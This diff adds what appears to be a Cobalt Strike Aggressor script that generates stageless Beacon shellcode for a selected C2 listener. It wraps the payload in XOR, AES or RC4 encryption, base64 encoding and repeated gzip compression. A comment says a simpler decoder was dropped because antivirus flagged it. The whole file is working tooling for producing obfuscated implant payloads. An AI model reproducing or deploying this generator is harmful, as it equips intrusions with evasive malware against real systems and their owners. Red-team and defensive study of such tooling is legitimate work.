@@ -1,0 +1,431 @@
+# Shellcode Generator
+#
+#	Shellcode Generator
+#		Generates beacon stageless shellcode with exposed exit method and additional formatting, encryption, encoding, compression, multiline output, etc
+#
+
+# Set paths below to files needed for the payload build. Paths are relative to the custom_payload_generator.cna script location
+
+# Build directory for shellcode generator
+$SCDIR = "/build/";
+
+# Temp file for shellcode
+$SCFILE = "/build/shellcode";
+
+# File containng byte size of the raw shellcode
+$RAWSIZE = "/build/raw_shellcode_size.txt";
+
+# File containng byte size of the final shellcode
+$FINALSIZE = "/build/final_shellcode_size.txt";
+
+# File containng the XOR encryption key used by the generated shellcode
+$XORKEY = "/build/xor_key.txt";
+
+# File containng the AES/RC4 encryption key used by the generated shellcode
+$ENCKEY = "/build/encryption_key.txt";
+
+# Python script used to generate the aes encrypted shellcode file
+$ENCPYTHON = "/assets/encrypt_file.py";
+
+# .NET PE used to generate the aes encrypted shellcode file
+$ENCEXE = "/assets/Encryptor.exe";
+
+# Python script used to generate the UUID formatted shellcode file
+$UUIDPYTHON = "/assets/bin2uuids_file.py";
+
+# File containing the output of format_shellcode for python injestion
+$FORMATTED = "/build/formatted_shellcode";
+
+# File containing the output of python encryption
+$ENCRYPTED = "/build/encrypted_shellcode";
+
+# Help file for the payload
+$HELPFILE = "/help/shellcode_generator_help.html";
+
+# ensure this function name is called again at the end of this build script
+sub generate_shellcode {
+# Generate and cutomize the payload submenu
+	$dialog = dialog("Shellcode Generator", %(listener => "Select Listener", xor_key => random_string("5"), encryption_key => random_string("32"), line_length => "80"), &shellcode_gen);
+	dialog_description($dialog, "Generate beacon stageless shellcode or use external shellcode file. Options applied in descending order.");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "payload_type", "Delivery: ", @("Stageless","Staged"));
+	drow_combobox($dialog, "exit_method", "Exit Method: ", @("process", "thread"));
+	drow_combobox($dialog, "syscalls_type", "Beacon Syscalls Method: ", @("none","direct","indirect"));
+	drow_combobox($dialog, "http_type", "Beacon HTTP Library: ", @("wininet","winhttp"));
+	drow_checkbox($dialog, "local", "Local Pointers: ", "Embeded Pointers from an Existing Session");
+	drow_beacon($dialog, "bid", "Existing Session: ");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 Shellcode");
+	drow_file($dialog, "scfile", "Or Use Shellcode File: ");
+	drow_combobox($dialog, "format", "Formatting: ", @("raw","hex","0x90\,0x90\,0x90","\\x90\\x90\\x90","0x90uy\;0x90uy\;0x90uy\;","UUID","b64"));
+	drow_checkbox($dialog, "XOR", "XOR: ", "XOR Encrypt Shellcode");
+	drow_text($dialog, "xor_key", "XOR Key\(s\): ");
+	drow_checkbox($dialog, "RC4", "RC4: ", "RC4 Encrypt Shellcode");
+	drow_checkbox($dialog, "AES", "AES: ", "AES Encrypt Shellcode");
+	drow_checkbox($dialog, "enc_exe", "RC4/AES Backend: ", "Encrypt using .NET exe (unchecked uses python)");
+	drow_text($dialog, "encryption_key", "AES or RC4 Key: ");
+	drow_combobox($dialog, "encode_compress", "Encoding/Compression: ", @("none","b64","gzip then b64","gzip","b64 then gzip","b64 then 7xgzip"));
+	drow_combobox($dialog, "multiline", "Multiline Output: ", @("none","quoted","chunks.push_back"));
+	drow_text($dialog, "line_length", "Multiline Length: ");
+	dbutton_action($dialog, "Generate");
+	dbutton_help($dialog, "file:".script_resource($HELPFILE)."");
+	dialog_show($dialog);
+}
+
+sub shellcode_gen {
+	# Uncomment to enable cna script debugging
+	#debug(debug() | 64);
+
+	# Assign menu selections to variables used in shellcode build
+	#$exit_method = $3['exit_method'];
+	$xorkey = $3['xor_key'];
+	$enckey = $3['encryption_key'];
+	$linelength = $3['line_length'];
+
+	# Error if no Listener or file is selected
+	if (($3['listener'] ismatch "Select Listener") && ($3['scfile'] ismatch "")) {
+		#berror($1, 'You did not select a proper Listener.');
+		show_message("Please select a proper Listener or Shellcode file.");
+		break;
+	}
+
+	else {
+		# Set shellcode architecture based on menu checkbox selection
+		$arch = "x64";
+		if ($3['x86'] eq "true") {
+			$arch = "x86";
+		}
+		
+		# Error if Staged delivery type is selected
+		if ($3['payload_type'] eq "Staged") {
+			berror($1, 'You did not select Stagless Delivery.');
+			show_message("Only Stageless Delivery supported for this shellcode generator.");
+			break;
+		}
+
+		###### Load or Create Beacon Shellcode Section
+
+		# Alternate import of shellcode from a file if path is supplied
+		if ($3['scfile'] ne ""){
+			$shellcode_file = openf($3['scfile']);
+			$shellcode = readb($shellcode_file, -1);
+			closef($shellcode_file);
+			println("Using shellcode file at: " . $3['scfile']);
+		}
+
+		# Create beacon shellcode with local session pointers, listener, architecture, and exit method
+			else if ($3['local'] eq "true") {
+				$shellcode = payload_local($3['bid'], $3['listener'], $arch, $3['exit_method'], $3['syscalls_type'], $3['http_type']);
+				println("CSSG generating Beacon shellocode");
+				println("Listener: " . $3['listener']);
+				println("Embedding pointers from Beacon ID: " . $3['bid']);
+				println("Architecture: " . $arch);
+				println("Exit Method: " . $exit_method);
+				println("Syscalls: " . $3['syscalls_type']);
+				println("HTTP Library: " . $3['http_type']);
+			}
+		
+		# else Create the beacon shellcode with listener, architecture, and exit method
+			else {
+				$shellcode = payload($3['listener'], $arch, $3['exit_method'], $3['syscalls_type'], $3['http_type']);
+				println("CSSG generating Beacon shellocode");
+				println("Listener: " . $3['listener']);
+				println("Architecture: " . $arch);
+				println("Exit Method: " . $exit_method);
+				println("Syscalls: " . $3['syscalls_type']);
+				println("HTTP Library: " . $3['http_type']);
+			}
+
+		# Get raw shellcode size in bytes
+		$sc_size = strlen($shellcode);
+
+		###### Formatting Section
+
+		# RAW/No Formatting
+		if ($3['format'] eq "raw") {
+			$format_shellcode = $shellcode;
+		}
+
+		# hex format
+		if ($3['format'] eq "hex") {
+			$format_shellcode = transform($shellcode, "hex");
+		}
+		
+		# c# format
+		if ($3['format'] eq "0x90\,0x90,\0x90") {
+			$format_shellcode = format_csharp($shellcode);
+		}
+
+		# f# format
+		if ($3['format'] eq "0x90uy\;0x90uy\;0x90uy\;") {
+			$format_shellcode = format_fsharp($shellcode);
+		}
+
+		# c/cpp format
+		if ($3['format'] eq "\\x90\\x90\\x90") {
+			$format_shellcode = format_cpp($shellcode);
+		}
+
+		# UID format
+		if ($3['format'] eq "UUID") {
+			# Write $shellcode to a file for formatting
+			$shellcode_resource = openf(">".script_resource($SCFILE)."");
+			writeb($shellcode_resource, $shellcode);
+			closef($shellcode_resource);
+			sleep(3 * 1000);
+			# Use UUID python script to transform the shellcode file
+			$uuid_python = script_resource(($UUIDPYTHON)."");
+			$in_file = script_resource(($SCFILE)."");
+			$out_file = script_resource(($FORMATTED)."");
+			exec("python ". $uuid_python ." $in_file $out_file");
+			println("python ". $uuid_python ." $in_file $out_file");
+			sleep(3 * 1000);
+			# Set $format_shellcode value from the UUID transformed file
+			$format_resource = openf(script_resource($FORMATTED)."");
+			$format_shellcode = readb($format_resource, -1);
+			closef($encrypted_resource);
+		}
+
+		# early b64 encoding option
+		if ($3['format'] eq "b64") {
+			$format_shellcode = base64_encode($shellcode);
+			#$format_shellcode = transform($shellcode, "powershell-base64");
+		}
+
+		###### Encryption Section
+
+		# Error if multiple encryption types are selected
+		if ($3['XOR'] eq "true" && $3['AES'] eq "true") {
+			show_message("Cannot select both encryption types, try again");
+			break;
+		}
+		
+		# No Encryption
+		if ($3['XOR'] eq "false" && $3['AES'] eq "false") {
+			$encrypted_shellcode = $format_shellcode
+		}
+		
+		# XOR Encryption
+		if ($3['XOR'] eq "true") {
+			$encrypted_shellcode = str_xor($format_shellcode, $xorkey);
+			# Save XOR key to a file
+			$xorkey_resource = openf(">".script_resource($XORKEY)."");
+			writeb($xorkey_resource, $xorkey);
+			closef($xorkey_resource);
+			# Show XOR key in popup message and script console
+			println("XOR Key: " . $xorkey . "");
+			show_message("XOR key used is: $xorkey");
+		}
+		
+		# AES Encryption
+		if ($3['AES'] eq "true") {
+			# Write $format_shellcode to a file for encryption
+			$formatted_resource = openf(">".script_resource($FORMATTED)."");
+			writeb($formatted_resource, $format_shellcode);
+			closef($formatted_resource);
+			sleep(3 * 1000);
+			# Save AES key to a file
+			$key_resource = openf(">".script_resource($ENCKEY)."");
+			writeb($key_resource, $enckey);
+			closef($key_resource);
+			# Show AES key in script console
+			println("AES Key: " . $enckey . "");
+			#show_message("AES key used is: $aeskey");
+			sleep(3 * 1000);
+			# Use AES script or exe to encrypt the formatted shellcode file
+			$encrypt_python = script_resource(($ENCPYTHON)."");
+			$encrypt_exe = script_resource(($ENCEXE)."");
+			$in_file = script_resource(($FORMATTED)."");
+			$out_file = script_resource(($ENCRYPTED)."");
+			println("AES Encrypting the shellcode with the following command:");
+			if ($3['enc_exe'] eq "true") {
+				exec("". $encrypt_exe ." aes encrypt $enckey $in_file $out_file");
+				println("". $encrypt_exe ." aes encrypt $enckey $in_file $out_file");
+			}
+			else {
+				exec("python ". $encrypt_python ." aes encrypt $enckey $in_file $out_file");
+				println("python ". $encrypt_python ." aes encrypt $enckey $in_file $out_file");	
+			}
+			sleep(3 * 1000);
+			# Set $encrypted_shellcode value from the encrypted file
+			$encrypted_resource = openf(script_resource($ENCRYPTED)."");
+			$encrypted_shellcode = readb($encrypted_resource, -1);
+			closef($encrypted_resource);
+			sleep(3 * 1000);
+		}
+
+		# RC4 Encryption
+		if ($3['RC4'] eq "true") {
+			# Write $format_shellcode to a file for encryption
+			$formatted_resource = openf(">".script_resource($FORMATTED)."");
+			writeb($formatted_resource, $format_shellcode);
+			closef($formatted_resource);
+			sleep(3 * 1000);
+			# Save AES key to a file
+			$key_resource = openf(">".script_resource($ENCKEY)."");
+			writeb($key_resource, $enckey);
+			closef($key_resource);
+			#$rc4key = $enckey;
+			$rc4key = ("\"". $enckey ."\"");
+			# Show AES key in script console
+			println("RC4 Key: " . $rc4key . "");
+			#show_message("RC4 key used is: $rc4key");
+			sleep(3 * 1000);
+			# Use AES script or exe to encrypt the formatted shellcode file
+			$encrypt_python = script_resource(($ENCPYTHON)."");
+			$encrypt_exe = script_resource(($ENCEXE)."");
+			$in_file = script_resource(($FORMATTED)."");
+			$out_file = script_resource(($ENCRYPTED)."");
+			println("RC4 Encrypting the shellcode with the following command:");
+			if ($3['enc_exe'] eq "true") {
+				exec("". $encrypt_exe ." rc4 encrypt $rc4key $in_file $out_file");
+				println("". $encrypt_exe ." rc4 encrypt $rc4key $in_file $out_file");
+			}
+			else {
+				exec("python ". $encrypt_python ." rc4 encrypt $rc4key $in_file $out_file");
+				println("python ". $encrypt_python ." rc4 encrypt $rc4key $in_file $out_file");	
+			}
+			sleep(3 * 1000);
+			# Set $encrypted_shellcode value from the encrypted file
+			$encrypted_resource = openf(script_resource($ENCRYPTED)."");
+			$encrypted_shellcode = readb($encrypted_resource, -1);
+			closef($encrypted_resource);
+			sleep(3 * 1000);
+		}
+
+		# position-independent blob of xor shellcode with an embeded decoder
+		# DID NOT USE, xor decoder flagged by AV
+		#$encoded_shellcode = encode($format_shellcode, "xor", $arch);
+		
+		###### Encoding and Compression section
+
+		# No additional encoding/compression
+		if ($3['encode_compress'] eq "none") {
+			$encoded_shellcode = $encrypted_shellcode;
+		}
+
+		# b64 encoded only
+		if ($3['encode_compress'] eq "b64") {
+			$encoded_shellcode = base64_encode($encrypted_shellcode);
+		}
+
+		# gzip compressed then b64 encoded shellcode
+		if ($3['encode_compress'] eq "gzip then b64") {
+			$encoded_shellcode = base64_encode(gzip($encrypted_shellcode));
+		}
+
+		# gzip compressed only
+		if ($3['encode_compress'] eq "gzip") {
+			$encoded_shellcode = gzip($encrypted_shellcode);
+		}
+
+		# b64 encoded then gzip compressed shellcode
+		if ($3['encode_compress'] eq "b64 then gzip") {
+			$encoded_shellcode = gzip(base64_encode($encrypted_shellcode));
+		}
+
+		# b64 encoded then 7x gzip compressed shellcode
+		if ($3['encode_compress'] eq "b64 then 7xgzip") {
+			$encoded_shellcode = gzip(gzip(gzip(gzip(gzip(gzip(gzip(base64_encode($encrypted_shellcode))))))));
+		}
+
+		###### Multiline Output Section
+
+		if ($3['multiline'] eq "none") {
+		$final_shellcode = $encoded_shellcode;
+		sleep(3 * 1000);
+		}
+
+		if ($3['multiline'] eq "quoted") {
+		$final_shellcode = format_multiline($encoded_shellcode);
+		sleep(3 * 1000);
+		}
+
+		if ($3['multiline'] eq "chunks.push_back") {
+		$final_shellcode = format_chunks($encoded_shellcode);
+		sleep(3 * 1000);
+		}
+
+		###### Shellcode writing section
+
+		# Get final shellcode size and write to a file
+		$final_size = strlen($final_shellcode);
+		$finalsize_resource = openf(">".script_resource($FINALSIZE)."");
+		writeb($finalsize_resource, $final_size);
+		closef($finalsize_resource);
+
+		# Write raw shellcode size to a file
+		$rawsize_resource = openf(">".script_resource($RAWSIZE)."");
+		writeb($rawsize_resource, $sc_size);
+		closef($rawsize_resource);
+
+		# Write shellcode to a file
+		$resource = openf(">".script_resource($SCFILE)."");
+		writeb($resource, $final_shellcode);
+		closef($resource);
+		sleep(3 * 1000);
+
+		# Promt to save shellcode to a user location and filename
+		$name = prompt_file_save("beacon", {
+			local('$outfile');
+			$outfile = openf("> $+ $1");
+			writeb($outfile, $final_shellcode);
+			closef($outfile);
+			# Show raw and final shellcode size in popup message and script console
+			println("RAW Shellcode size: " . $sc_size . "");
+			println("Final Shellcode size: " . $final_size . "");
+			show_message("Raw shellcode size is: $sc_size bytes, Final shellcode size is: $final_size bytes");
+		});
+	}
+}
+
+###### Helper Functions Section
+
+# generate random string for variable substitution and keygens
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+# Format shellcode into C# type 0x90,0x90,0x90
+sub format_csharp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join(",0x", @fmt);
+}
+
+# Format shellcode into F# type 0x90uy;0x90uy;0x90uy;
+sub format_fsharp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "0x". join("uy\;0x", @fmt) ."uy\;";
+}
+
+# Format shellcode into C/C++ type \x90\x90\x90
+sub format_cpp {
+	$key = $1;
+	@fmt = str_chunk(transform($key, "hex"), 2);
+	return "\\x". join("\\x", @fmt);
+}
+
+# Format shellcode into quoted multi-line output
+sub format_multiline {
+	$key = $1;
+	@fmt = str_chunk($key, $linelength);
+	return "\"". join("\"\n\"", @fmt) ."\"";
+}
+
+# Format shellcode into chunks.push_back(""); multi-line output
+sub format_chunks {
+	$key = $1;
+	@fmt = str_chunk($key, $linelength);
+	return "chunks.push_back(\"". join("\"\)\;\nchunks.push_back(\"", @fmt) ."\"\)\;";
+}
+
+# Run main generate_shellcode function
+generate_shellcode();
